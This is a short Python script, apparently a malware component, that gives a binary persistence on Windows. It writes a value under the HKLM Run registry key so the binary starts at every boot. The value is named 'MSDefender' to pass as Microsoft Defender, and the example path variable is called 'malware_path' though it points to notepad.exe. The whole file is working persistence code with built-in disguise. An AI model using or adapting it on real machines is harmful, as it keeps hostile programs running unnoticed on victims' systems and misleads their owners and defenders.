from winreg import OpenKey, CloseKey, QueryValueEx, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ


def persist(file_path):
    """
    Persist binary passed to the function.
    So, this function adds a new value to a specific registry key.
    All binaries specified in this registry key runs on each computer startup.
    :param file_path: path to the binary we want to persist
    :return:
    """
    run_sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "MSDefender"
    run_key = OpenKey(HKEY_LOCAL_MACHINE, run_sub_key, 0, KEY_ALL_ACCESS)
    try:
        QueryValueEx(run_key, value_name)
    except:
        SetValueEx(run_key, value_name, 0, REG_SZ, file_path)
    CloseKey(run_key)


if __name__ == '__main__':
    malware_path = r"C:\Windows\System32\notepad.exe"
    persist(malware_path)
